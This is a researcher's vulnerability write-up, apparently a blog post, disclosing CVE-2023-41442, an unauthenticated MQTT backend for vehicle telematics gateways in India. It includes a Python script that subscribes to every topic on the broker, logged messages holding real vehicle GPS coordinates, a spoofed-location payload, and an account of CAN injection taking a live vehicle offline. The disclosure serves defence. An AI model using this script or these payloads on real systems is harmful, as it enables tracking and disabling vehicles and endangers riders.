=== Content from writeups.ayyappan.me_a8ca8300_20250114_191542.html ===
[![](https://writeups.ayyappan.me/~gitbook/image?url=https%3A%2F%2F3053492068-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FUW1W5w6icFMhtoIxQE3I%252Ficon%252FpckSHo7Wu9exmhOjLdYt%252Flogo.png%3Falt%3Dmedia%26token%3D3f95640f-4d99-473f-95d8-9b65c03b63b9&width=32&dpr=4&quality=100&sign=5f85a915&sv=2)![](https://writeups.ayyappan.me/~gitbook/image?url=https%3A%2F%2F3053492068-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FUW1W5w6icFMhtoIxQE3I%252Ficon%252FpckSHo7Wu9exmhOjLdYt%252Flogo.png%3Falt%3Dmedia%26token%3D3f95640f-4d99-473f-95d8-9b65c03b63b9&width=32&dpr=4&quality=100&sign=5f85a915&sv=2)Write-ups](/tor-iot-mqtt)Remotely Hijacking 600+ Indian Automobiles[Introduction](https://writeups.ayyappan.me/?fallback=true)[Remotely Hijacking 600+ Indian Automobiles](https://writeups.ayyappan.me/tor-iot-mqtt?fallback=true)[ONCD DEFCON31 Badge Write up](https://writeups.ayyappan.me/oncd-defcon31-badge-write-up?fallback=true)Search...Ctrl + KRemotely Hijacking 600+ Indian Automobiles[Introduction](https://writeups.ayyappan.me/?fallback=true)[Remotely Hijacking 600+ Indian Automobiles](https://writeups.ayyappan.me/tor-iot-mqtt?fallback=true)[ONCD DEFCON31 Badge Write up](https://writeups.ayyappan.me/oncd-defcon31-badge-write-up?fallback=true)

* [⚠️Cyber Terror on Wheels: Remotely Hijacking 600+ Indian Automobiles](/tor-iot-mqtt)

[Powered by GitBook](https://www.gitbook.com/?utm_source=content&utm_medium=trademark&utm_campaign=UW1W5w6icFMhtoIxQE3I)On this page
# Cyber Terror on Wheels: Remotely Hijacking 600+ Indian Automobiles

This writeup discusses CVE-2023-41442, a critical vulnerability that allows an attacker to track over 600+ automobiles as well as remotely controlling them, endangering the safety of the rider.

Last updated 1 year ago

Table of Contents

[Electric Vehicles in India, and more](/tor-iot-mqtt#electric-vehicles-in-india-and-more)

[C.I.A Triad and a crash course on automotive security](/tor-iot-mqtt#c.i.a.-triad-and-a-crash-course-on-automotive-security)

[The Vulnerability](/tor-iot-mqtt#the-vulnerability)

[Impact](/tor-iot-mqtt#impact)

[Conclusion](/tor-iot-mqtt#conclusion)

[Map of affected devices](https://ayyappan.me/logged-vehicles-map.html)

## Electric Vehicles in India, and more

According to the report titled[*"Inside Indian consumers’ embrace of electric two-wheelers"* report by McKinsey](https://www.mckinsey.com/industries/automotive-and-assembly/our-insights/inside-indian-consumers-embrace-of-electric-two-wheelers), the prospects for electric two-wheelers, including motorcycles and scooters, are promising. Given their widespread availability and cost-effectiveness, these vehicles have played a significant role in India's transportation landscape for a long time, constituting over 70% of all vehicles. Furthermore, consumers are increasingly inclined towards embracing electric alternatives: it is anticipated that electric two-wheelers will make up a substantial portion, ranging from 60% to 70%, of new vehicle sales in India by 2030. What's more, consumers are not only willing to acquire more electric two-wheelers but are also changing their purchasing habits by adopting a more comprehensive shopping experience across various channels.

#### Background

The initial discovery of CVE-2023-22906 sparked my interest in the Internet of Things, specifically those that were Made in India. Upon searching Shodan.io for protocols often used by IoT devices, several servers were found as shown in the image below.

Among the multitude of servers, one in particular piqued my interest. It contained references to CAN and various other subjects, including Diagnostics, suggesting a connection to the automotive industry. This piqued my curiosity because CAN is a message-based protocol specifically designed to facilitate communication among the Electronic Control Units (ECUs) commonly found in modern automobiles.

The keyword "CAN" was a tip towards mobility IoT devices which could have potential for cyber physical impacts, which motivated me to conduct a more thorough investigation.

#### Affected Vendor

Upon analyzing the data and traffic from the server, it was discovered that the affected vendor is Tor.AI.

Tor.AI provides end-to-end Industrial IoT (IIoT) solutions that help businesses improve their operations, reduce costs, and increase productivity. Their solutions include edge gateways, platform, application, analytics, and supporting services.

Tor.AI's solutions are used in a variety of industries, including manufacturing, retail, mining and contracting, warehouse and logistics, foundries, construction, chiller, genset, and compressor. Although, this focuses on the Tor Loco Gateway, which is designed for heavy equipment fleet management. It can track the location, speed, and fuel consumption of heavy equipment, as well as provide alerts for safety and maintenance issues.

The website indicated that their solution was deployed in several companies as shown below, one of which is an Indian Government-owned aerospace and defense electronics company, followed by large multinational companies.

##

## C.I.A. Triad and a crash course on automotive security

### C.I.A. Triad

Modern cars have evolved into complex computers on wheels. They are equipped with advanced electronic control systems, sensors, and software that manage everything from engine performance and safety features to entertainment and connectivity. These systems make vehicles smarter, more efficient, and more connected than ever before.

As a result, the automotive industry is investing heavily in cybersecurity measures to protect vehicles from cyberattacks, ensuring that the data and systems within these "computers on wheels" remain secure.

The CIA triad is a foundational concept in information security and cybersecurity that consists of three core principles, which are essential for safeguarding information and data:

2. **Confidentiality:** This principle ensures that information is only accessible to those who have the proper authorization or permission to view it. Confidentiality involves protecting sensitive data from unauthorized access, disclosure, or exposure.
5. **Integrity:** The integrity principle focuses on the accuracy and reliability of data. It ensures that data remains unchanged and uncorrupted during storage, transmission, and processing. Any unauthorized or accidental modifications or alterations to data should be detected and prevented.
8. **Availability:** Availability ensures that information and resources are consistently accessible and operational for authorized users. This means that information should be available when needed, without disruptions caused by issues like downtime, system failures, or cyberattacks.

The CIA triad, a fundamental framework in information security, guides organizations in designing and implementing security measures to safeguard their data and systems. This triad emphasizes the principles of confidentiality, integrity, and availability. In the context of automotive cybersecurity, where cars have transformed into highly sophisticated computers on wheels, these principles are crucial. Safeguarding vehicle systems and data ensures that they remain confidential, integral, and available, thereby guaranteeing the safety and security of both the vehicle and its passengers.

### Crash course on Automotive security

Automotive security is crucial in today's connected and autonomous vehicle landscape to protect against cyber threats that could compromise the safety and functionality of vehicles.

Some of the different attack vectors are as seen in the image below, through which an attacker could compromise a connected vehicle.

In order for functions like unlocking the doors, braking, steering, and many other vital operations to work seamlessly, the car must be able to communicate with multiple sensors and electronic control units (ECUs) via the Controller Area Network (CAN bus). This intricate network of interconnected components ensures that the vehicle operates safely, efficiently, and in harmony with the driver's inputs and the surrounding environment.

Some of the most well known attacks on connected cars are the [Jeep Hack](https://www.wired.com/2015/07/hackers-remotely-kill-jeep-highway/), [Web Hackers vs. The Auto Industry](https://samcurry.net/web-hackers-vs-the-auto-industry/) and [Ready, Fire Aim : Hacking State and Federal Law Enforcement Vehicles](https://youtu.be/7pnwpF94WCM)

#### CAN bus

The Controller Area Network (CAN) bus, often referred to as the "nervous system" of a vehicle, is a fundamental component in modern automotive technology. This analogy draws a parallel between the CAN bus and the human nervous system, emphasizing its crucial role in facilitating communication between various parts of a vehicle, similar to how the nervous system coordinates and transmits signals throughout the human body.

Quoting [Dr. Tindell from Canis Labs](https://canislabs.com/cansecurity/), one major drawback to CAN is that it has **no security features** and is vulnerable to all kinds of attacks, many that would have been inconceivable when CAN was created in 1986. The CAN bus can be accessed either through physically accessing the wiring, or remotely through systems such as the TPMS, Infotainment, Telematics etc.

Some of the attacks as discussed in [CANAttack: Assessing Vulnerabilities within Controller Area Network](https://www.mdpi.com/1424-8220/23/19/8223) are as follows

* Spoofing attack: Occurs when a compromised node sends CAN data frames with a changed (forged) ID field to masquerade as data or a command from a valid-source ECU node.
* Injection attack: Direct or indirect access points to inject messages into the CAN bus, suppress valid communications (i.e., genuine messages with higher-priority IDs than injected ones are ignored), or penetrate an ECU to perform malicious actions.
* Denial of Service (DoS) attack: CAN’s arbitration system allows higher-priority nodes to talk first. Because of the prioritization on the CAN bus, if a malicious node with the highest priority is always active, the other nodes cannot interact. This may be achieved by flooding the bus with smallest feasible arbitration ID (0x00)

## The Vulnerability

The vulnerability in write-up focuses on the Tor IoT Gateway solution's MQTT backend, which has been repeatedly been found to have no authentication required, in order to subscribe and publish to it.

The vulnerability was first discovered and reported to CERT-In in May 2023, tracked as CERTIn-41501723, after which the vendor had reported that the issue had been mitigated. Unfortunately, the same issue persisted a few months later in August 2023, now with more automobiles that are subscribed to the MQTT broker.

Since then, the vulnerability has been patched, and is tracked by MITRE as **CVE-2023-41442,** which affects the following products and versions

* Tor Loco Mini version 1.0 through 3.1
* Tor Equip Gateway version 1.0
* Tor Shield version 1.0
* Tor Lenz version 0.0.1

The Common Weakness Enumeration's(CWE) that are associated with this are as follows

* CWE-287 : Improper Authentication
* CWE-345: Insufficient Verification of Data Authenticity
* CWE-319 : Cleartext Transmission of Sensitive Information
* CWE-306 : Missing Authentication for Critical Function

## Logging Data

To further analyze what data was being sent, and to log all the data on the MQTT broker, a simple python script was written which saves all traffic as shown below.

Copy
```
import time
import logging
from paho.mqtt import client as mqtt_client
# Configure logging
logging.basicConfig(filename='log.txt', level=logging.INFO, format='%(asctime)s - %(message)s')
# Update these with your MQTT broker's IP address and port
broker_ip = 'IP Address Here'
broker_port = 1883
def on_connect(client, userdata, flags, rc):
    if rc == 0:
        print("Connected to MQTT broker")
        client.subscribe("#")  # Subscribe to wildcard topic
    else:
        print(f"Failed to connect, return code {rc}")
def on_message(client, userdata, msg):
    log_message = f"Topic: {msg.topic} | Message: {msg.payload.decode()}"
    print(log_message)
    logging.info(log_message)
def main():
    client = mqtt_client.Client()
    client.on_connect = on_connect
    client.on_message = on_message
    client.connect(broker_ip, broker_port)
    try:
        client.loop_forever()
    except KeyboardInterrupt:
        print("\nDisconnecting from MQTT broker")
        client.disconnect()
if __name__ == "__main__":
    main()
```

When executed, the python script establishes a connection to the MQTT broker and saves all data being sent on it, an example is shown below.

Copy
```
2023-08-22 16:25:10,221 - Topic: Bgauss/MQTT_v1/Payload | Message: *,054016081714307369035636176,Mini/L433/Bgauss,230822 162448,LXV3.1,20230822105506,11.037950,77.388293,^,0,0,0,0,0,0,0,0,^,f,2,f,6,f,a,f,6,^,f,1,e,ff,f,3,f,6,^,e,f2,f,1,f,4,f,1,^,f,0,f,5,f,2,f,1c,^,2,6d,0,1d,4d,20,64,0,^,37,16,0,4,7f,7,98,4a,^,25,26,21,22,21,0,0,0,^,0,0,f,1c,e,f2,0,0,^,34,65,39,61,32,32,35,34,^,54,0,0,0,0,0,0,0,^,7,e7,0,1,0,11,0,8,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,b,b,b,b,b,b,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,7,e6,0,7,0,1,0,1,^,0,0,0,0,0,0,0,0,^,1e,c8,5,1e,a,5d,a,4d,^,7,e6,0,7,0,13,0,1,^,f,44,0,5c,0,0,48,40,^,80,80,80,0,0,0,f,0,^,0,16,0,7,0,d,75,31,^,0,0,0,0,0,0,0,0,^,61,b,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,47,e7,c3,0,0,0,0,^,7,e6,0,a,0,d,0,6,^,c0,a9,a2,4d,0,48,2c,4a,^,be,d1,5,29,20,0,0,aa,26,0,0,#
2023-08-22 16:25:10,350 - Topic: Poc_Locohe/MQTT_v1/Payload | Message: *,054061957714817894445898342,TorMini_4G_Rev1.0_0223/Cummins,20230822105501,V1.0,20230822162506,105501,22.291063,N,86.849556,E,220823,00011,L,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,TD_000000,E,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,19,99,#
2023-08-22 16:25:10,964 - Topic: Bgauss/MQTT_v1/Payload | Message: *,054022789514975180843997742,Mini/L433/Bgauss,230822 162413,LXV3.1,20230822105505,16.860182,74.296588,^,0,0,0,0,0,0,0,0,^,e,bc,e,bf,e,be,e,c1,^,e,ba,e,c2,e,c0,e,c2,^,e,b6,e,c0,e,bf,e,c2,^,e,be,e,bf,e,bd,e,c9,^,2,5c,6,1f,42,20,64,0,^,37,16,0,18,c2,7,11,45,^,24,26,21,21,21,0,0,0,^,0,0,e,c9,e,b6,0,0,^,32,63,31,38,65,30,38,33,^,54,0,0,0,0,0,0,0,^,7,e6,0,6,0,1b,0,6,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,5,5,5,5,5,5,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,7,e6,0,7,0,1,0,1,^,0,0,0,0,0,0,0,0,^,1d,c1,8,2b,12,34,a,25,^,7,e6,0,7,0,13,0,1,^,18,24,0,56,0,0,53,40,^,80,80,80,0,0,0,f,0,^,0,16,0,7,0,d,75,31,^,0,0,0,0,0,0,0,0,^,5f,8d,7,d0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,a2,5e,ba,0,0,0,0,^,0,16,0,8,0,b,0,4,^,c0,a9,a2,41,0,44,2c,49,^,2f,31,c1,43,20,0,0,aa,22,0,0,#
2023-08-22 16:25:11,005 - Topic: Omega/MQTT_v1/Payload | Message: *,054016081714307369016553652,TorMini/OmegaSeiki/0422_Payload,2023-8-22 16:25:8,v1.3,20230822105508,28.498319,77.408490,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,4,0,0,0,3c,^,0,0,0,0,0,0,0,0,^,0,0,0,0,b4,5a,ff,f8,^,f,d2,e,54,b,cc,e,47,^,cd,fc,2b,2,66,ff,fd,1,^,0,0,0,0,0,0,0,0,^,0,2,a9,90,2,0,0,0,^,0,0,0,0,10,0,0,1,^,1,0,64,0,0,0,7b,2a,19,0,#
2023-08-22 16:25:11,005 - Topic: Omega/MQTT_v1/Geo | Message: *,054016081714307369045242986,TorMini/OmegaSeiki/0422_Geo,2023-8-22 16:25:8,v1.3, 1,1,20230822105508.000,28.572833,77.163264,253.959,24.71,247.9,2,,0.8,1.1,0.9,,12,12,9,,41,,,29,0,1537,0,0,4,3,#
2023-08-22 16:25:11,005 - Topic: Omega/MQTT_v1/Geo | Message: *,054016081714307369032687039,TorMini/OmegaSeiki/0422_Geo,2023-8-22 16:25:7,v1.3, 1,1,20230822105507.000,28.678513,77.373997,230.622,0.26,273.2,2,,0.8,1.1,0.8,,11,13,9,,30,,,0,0,1480,0,0,3,3,#
2023-08-22 16:25:11,005 - Topic: Omega/MQTT_v1/Geo | Message: *,054016081714307369043997801,TorMini/OmegaSeiki/0422_Geo,2023-8-22 16:24:30,v1.3, 1,1,20230822105426.000,28.648279,77.121196,215.385,0.22,46.9,2,,0.8,1.2,0.9,,11,12,9,,32,,,3,0,1526,0,0,4,4,#
2023-08-22 16:25:11,094 - Topic: Poc_Locohe/MQTT_v1/Payload | Message: *,054061957714817894442293862,TorMini_4G_Rev1.0_0223/Cummins,20230822105502,V1.0,20230822162451,105502,11.672228,N,92.735260,E,220823,00012,L,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,00,TD_000000,E,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,Er2,20,99,#
2023-08-22 16:25:11,374 - Topic: Lohia/MQTT_v1/Payload | Message: *,054022789514975180845177458,TorMini/Lohia/0222_Payload,2023-8-22 16:25:8,v1.2,20230822105508,17.716721,83.328368,^,4,0,0,20,0,0,0,0,^,ff,3f,0,0,0,0,0,0,^,4,0,0,4,0,0,0,24,^,0,0,91,4e,0,0,0,0,^,0,0,0,0,0,0,3e,2a,^,ff,ff,ff,ff,7b,f9,0,0,^,1,1a,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,21,0,#
2023-08-22 16:25:11,419 - Topic: Bgauss/MQTT_v1/Payload | Message: *,054055326513800775772031708,Mini/L433/Bgauss,230822 162504,LXV3.1,0,0,0,^,0,0,0,0,0,0,0,0,^,f,30,f,36,f,37,f,35,^,f,33,f,33,f,36,f,38,^,f,2c,f,34,f,34,f,35,^,f,35,f,35,f,34,f,40,^,2,6f,3,d5,4d,20,64,0,^,37,16,0,10,27,7,a1,4b,^,21,22,1f,1f,1e,0,0,0,^,0,0,f,45,f,34,0,0,^,31,64,37,39,32,33,37,39,^,54,0,0,0,0,0,0,0,^,7,e6,0,6,0,1b,0,6,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,db,db,db,db,db,db,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,7,e6,0,7,0,1,0,1,^,0,0,0,0,0,0,0,0,^,1e,c8,8,a3,12,e1,8,90,^,7,e6,0,7,0,13,0,1,^,1e,24,0,4d,0,0,5a,40,^,0,0,80,0,0,0,f,0,^,0,16,0,7,0,d,75,31,^,0,0,0,0,0,0,0,0,^,5b,b2,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,8a,83,76,0,0,0,0,^,0,16,0,8,0,b,0,4,^,c0,a9,a3,4d,0,44,2c,47,^,ee,c2,85,31,20,0,0,aa,24,0,1,#
2023-08-22 16:25:33,815 - Topic: Bgauss/MQTT_v1/Diagnostic | Message: *,054016081714307369032424913_Conf,Diagnostic,Mini/L433/Bgauss,000101 000000,LXV3.1,CAN ID's : b9,b3,b4,b5,b6,bb,b7,bf,b2,b0,b1,be,b8,351,401,402,403,404,405,ba,bd,201,104,100,110,101,150,151,152,55,51,103,60,50,53,#
```
### Breaking down the payload

Using the following payload as an example

Copy
```
2023-08-22 16:25:33,815 - Topic: Omega/MQTT_v1/Payload | Message: *,054016081714307369012359352,TorMini/OmegaSeiki/0422_Payload,2023-8-22 16:23:36,v1.3,20230822105238,28.650064,77.200174,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,4,0,0,0,46,^,0,0,0,0,0,0,0,0,^,0,0,0,0,5a,5a,ff,fe,^,10,36,f,2d,b,ea,f,20,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,1,96,d3,1,f7,0,0,^,0,0,0,0,20,0,0,1,^,11,0,0,0,0,7,6e,31,31,0,#
```

The topic indicates that it is for the Omega Seiki scooter, followed by the date, time, and mention of version 1.3.

Following this, the longitude and latitude 28.650064,77.200174 is within, after which there are multiple CAN ID's follow that are 8 bytes in length, and each frame is separated by a (^) caret sign.

## Impact

### Confidentiality

Upon connecting to the MQTT server, location data is made available which impacts the confidentiality of the end user's locations and potentially can be used to track an individual/group's movements over a period of time. A map of the logged locations is as shown below.

The plotted map of **all** logged locations may be seen [**here.**](https://ayyappan.me/logged-vehicles-map.html)Please note that all the data has been anonymized and only contains longitudes and latitudes that have been mapped.

### Integrity

This section focuses on affecting the integrity of the end-user devices using the Tor IoT Gateway, by tampering the location and CAN data.

#### Modifying location data

In order to test for the ability to maliciously modify payloads, the longitude and latitudes were changed in the following.

### **Original Payload**

**Topic : Bgauss/MQTT\_v1/Payload**

Copy
```
*,054022789514975180843145785,Mini/L433/Bgauss,230519 013655,LXV3.1,20230518200816,17.413173,78.394992,^,0,0,0,0,0,0,0,0,^,e,aa,e,ac,e,a9,e,ac,^,e,ac,e,a8,e,a9,e,a9,^,e,aa,e,a7,e,a6,e,a9,^,e,aa,e,a9,e,aa,e,b3,^,2,59,0,ba,36,20,63,0,^,37,16,0,c,5b,5,fb,3b,^,2b,2d,25,26,25,0,0,0,^,0,0,e,b3,e,a6,0,0,^,56,42,30,30,30,31,35,35,^,54,0,0,0,0,0,0,0,^,7,e6,0,6,0,1b,0,6,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,54,54,54,54,54,54,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,1d,d3,0,e3,4,b1,3,33,^,7,e6,0,7,0,13,0,1,^,7,24,0,5a,0,0,3f,40,^,0,80,80,0,0,0,f,0,^,0,16,0,7,0,d,75,31,^,0,0,0,0,0,0,0,0,^,4c,20,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,89,7a,17,0,0,0,0,^,7,e6,0,a,0,d,0,6,^,c0,a9,a2,34,0,44,2c,4e,^,9b,b7,49,df,40,0,0,aa,25,0,0,#
```
### Malicious Payload

Coordinates are set to 41.633331,-71.006882 ( University of Massachusetts Dartmouth)

**Topic : Bgauss/MQTT\_v1/Payload**

Copy
```
*,054022789514975180843145785,Mini/L433/Bgauss,230519 013655,LXV3.1,20230518200816,41.633331,-71.006882,^,0,0,0,0,0,0,0,0,^,e,aa,e,ac,e,a9,e,ac,^,e,ac,e,a8,e,a9,e,a9,^,e,aa,e,a7,e,a6,e,a9,^,e,aa,e,a9,e,aa,e,b3,^,2,59,0,ba,36,20,63,0,^,37,16,0,c,5b,5,fb,3b,^,2b,2d,25,26,25,0,0,0,^,0,0,e,b3,e,a6,0,0,^,56,42,30,30,30,31,35,35,^,54,0,0,0,0,0,0,0,^,7,e6,0,6,0,1b,0,6,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,54,54,54,54,54,54,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,1d,d3,0,e3,4,b1,3,33,^,7,e6,0,7,0,13,0,1,^,7,24,0,5a,0,0,3f,40,^,0,80,80,0,0,0,f,0,^,0,16,0,7,0,d,75,31,^,0,0,0,0,0,0,0,0,^,4c,20,0,0,0,0,0,0,^,0,0,0,0,0,0,0,0,^,0,89,7a,17,0,0,0,0,^,7,e6,0,a,0,d,0,6,^,c0,a9,a2,34,0,44,2c,4e,^,9b,b7,49,df,40,0,0,aa,25,0,0,#
```
### Results

Upper window is the subscriber, and is listening to that topic, whereas the bottom one is the publisher, that sends the modified payload with the changed coordinates.

As one of the main features of the gateway is the ability to add geofencing, it could cause the vehicle's anti-theft feature to trigger, thereby causing a denial of service and disabling the vehicle.

#### CAN Injection

As discussed in the [BlackHat presentation](https://youtu.be/4wgEmNlu20c) on Advanced CAN Injection techniques for Vehicle Networks, this section highlights the ability to remotely inject CAN frames to any/all connected vehicles.

As shown below, the Gateway lists Remote Immobilization as a feature, which is done through CAN.

As the entire attack and research was conducted remotely, a target vehicle that had been at a same location for a significant time during the early hours had been selected to ensure there was no utilization of the vehicle itself.

By using the DoS attack mentioned in the previous section, where flooding the bus with 0's, a crafted MQTT payload was sent in order to test for CAN Injection.

It was noticed that the vehicle stopped sending CAN/location data to the MQTT server for some time, indicating that the vehicle went offline before connecting back again, hence proving that CAN injection is possible.

## Conclusion

Given the remote location of the target vehicle and the limited access, it was evident that attempting to reverse engineer the CAN messages through physical access would have necessitated the time-consuming process of locating a physical target, gaining possession of the vehicle, and then proceeding with the reverse engineering. However, considering the gravity of the vulnerability and the substantial risks it posed, it was paramount to promptly report it to the concerned authority(CERT-In), even though the option of obtaining physical access might have been feasible but would have taken some time as all vehicles were located in India.

C-DOT (Centre for Development of Telematics) and the Telecommunication Engineering Centre (TEC), both integral components of the Ministry of Communications in the Government of India, have made substantial contributions to the domain of telecommunications and telematics. Their focus on shaping and regulating the burgeoning IoT (Internet of Things) and M2M (Machine-to-Machine) communication sectors has culminated in the publication of comprehensive documents and recommendations such as [this](https://tec.gov.in/public/pdf/M2M/Security%20by%20Design%20for%20IoT%20Device%20Manufacturers.pdf). These resources serve as indispensable guidelines for the secure development of IoT devices and M2M systems.

Covering a diverse array of concerns, these recommendations encompass stringent security standards, spectrum management to ensure seamless connectivity, promotion of interoperability between devices, robust privacy and data protection measures, and the definition of network architectures and protocols geared toward the pillars of security and reliability.

By adhering to the guidance provided by these organizations, the majority of vulnerabilities and risks inherent in IoT can be effectively mitigated by. This collaborative effort involving industry stakeholders, governmental bodies, and international partners not only establishes a robust regulatory framework but also fosters best practices that are instrumental in ensuring the secure and dependable implementation of IoT and M2M technologies, both in India and on a global scale. Lastly, C-DoT provides the C-DoT Common Service Platform (CCSP) which is based on the one M2M standard which may be used by several IoT vendors to provide reliable and secure services.

### Acknowledgements

I am deeply grateful to [Block Harbor](https://blockharbor.io/) for their invaluable guidance, and I want to extend my heartfelt appreciation to all those who have supported me throughout my journey, with a special emphasis on my esteemed professors and mentors

* [Prof. Lance Fiondella](https://lfiondella.sites.umassd.edu/)
* [Prof. Hong Liu](https://www.umassd.edu/directory/hliu/)
* [Prof. Aanjhan Ranganathan](https://aanjhan.com/)
* [Prof. Dayalan Kasilingam](https://www.umassd.edu/directory/dkasilingam/)
* [Sam Curry](https://www.linkedin.com/in/currysam)
* [Dr. Harshad Sathaye](https://harshadsathaye.com/)
* [Dr. Balsing Rajput](https://in.linkedin.com/in/dr-balsing-rajput)

* [Electric Vehicles in India, and more](#electric-vehicles-in-india-and-more)
* [C.I.A. Triad and a crash course on automotive security](#c.i.a.-triad-and-a-crash-course-on-automotive-security)
* [C.I.A. Triad](#c.i.a.-triad)
* [Crash course on Automotive security](#crash-course-on-automotive-security)
* [The Vulnerability](#the-vulnerability)
* [Logging Data](#logging-data)
* [Breaking down the payload](#breaking-down-the-payload)
* [Impact](#impact)
* [Confidentiality](#confidentiality)
* [Integrity](#integrity)
* [Original Payload](#original-payload)
* [Malicious Payload](#malicious-payload)
* [Results](#results)
* [Conclusion](#conclusion)
* [Acknowledgements](#acknowledgements)

Video PoC

⚠️![Page cover image](https://writeups.ayyappan.me/~gitbook/image?url=https%3A%2F%2Fmedia.cnn.com%2Fapi%2Fv1%2Fimages%2Fstellar%2Fprod%2F230821153117-hero-electric-scooters-india-file-restricted.jpg%3Fc%3Doriginal&width=1248&dpr=4&quality=100&sign=91a76db9&sv=2)![](https://writeups.ayyappan.me/~gitbook/image?url=https%3A%2F%2F3053492068-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FUW1W5w6icFMhtoIxQE3I%252Fuploads%252FbHzll3cF5mb8mhqeXRsm%252Fimage.png%3Falt%3Dmedia%26token%3D7f980c4e-83a0-4426-8b69-09cd5e6bf2a4&width=768&dpr=4&quality=100&sign=16667fda&sv=2)

Shodan.io map of servers with MQTT enabled in India

![](https://writeups.ayyappan.me/~gitbook/image?url=https%3A%2F%2F3053492068-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FUW1W5w6icFMhtoIxQE3I%252Fuploads%252FoJUIDmSBYIK2qkohCZMP%252Fimage.png%3Falt%3Dmedia%26token%3D520e2fcb-7456-42f4-bea8-114666238be0&width=768&dpr=4&quality=100&sign=20eed14b&sv=2)

Some of the places that use this product

![](https://writeups.ayyappan.me/~gitbook/image?url=https%3A%2F%2F3053492068-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FUW1W5w6icFMhtoIxQE3I%252Fuploads%252FWpNIKAkw3xWzHNiMmSxI%252Fimage.png%3Falt%3Dmedia%26token%3Dbcc22d57-2dc8-4bde-bcd6-49b451cc43a8&width=768&dpr=4&quality=100&sign=d93cd322&sv=2)

Some of the places that use this product pt.2

![CIA Triad](https://writeups.ayyappan.me/~gitbook/image?url=https%3A%2F%2F3053492068-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FUW1W5w6icFMhtoIxQE3I%252Fuploads%252Fd6Thv6wrYxGXSPStAmhv%252Fimage.png%3Falt%3Dmedia%26token%3D84b42455-4fb3-40c3-a64b-832710519494&width=768&dpr=4&quality=100&sign=3a0faf9f&sv=2)

C.I.A Triad
<https://www.f5.com/labs/learning-center/what-is-the-cia-triad>

![](https://writeups.ayyappan.me/~gitbook/image?url=https%3A%2F%2F3053492068-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FUW1W5w6icFMhtoIxQE3I%252Fuploads%252FchHpu80mtTiCOMJcVH4k%252Fimage.png%3Falt%3Dmedia%26token%3D37f71df6-4e2d-40e6-b247-6d71b23e869d&width=768&dpr=4&quality=100&sign=216ff724&sv=2)

<https://www.energy.gov/femp/federal-fleet-cybersecurity>

